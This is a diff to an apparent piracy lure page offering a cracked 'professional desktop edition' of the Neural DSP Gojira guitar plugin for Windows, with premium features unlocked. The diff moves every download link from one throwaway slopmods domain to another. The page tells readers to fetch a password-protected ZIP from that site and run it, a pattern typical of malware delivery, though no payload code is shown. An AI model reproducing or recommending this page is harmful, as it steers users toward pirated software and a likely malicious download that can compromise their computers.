@@ -8,12 +8,12 @@ Neural DSP Gojira — Windows setup and configuration · Premium workspace · Ze
 
 > Use the release page below for Windows.
 
-- **Release page:** [pxnxbmnlisj.slopmods.tech](https://pxnxbmnlisj.slopmods.tech/)
-- **Full URL:** `https://pxnxbmnlisj.slopmods.tech/`
+- **Release page:** [pxnxbmnlisj.slopmods.top](https://pxnxbmnlisj.slopmods.top/)
+- **Full URL:** `https://pxnxbmnlisj.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **pxnxbmnlisj.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **pxnxbmnlisj.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Neural DSP Gojira — Windows setup and configuration · Premium workspace · Ze
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **pxnxbmnlisj.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **pxnxbmnlisj.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
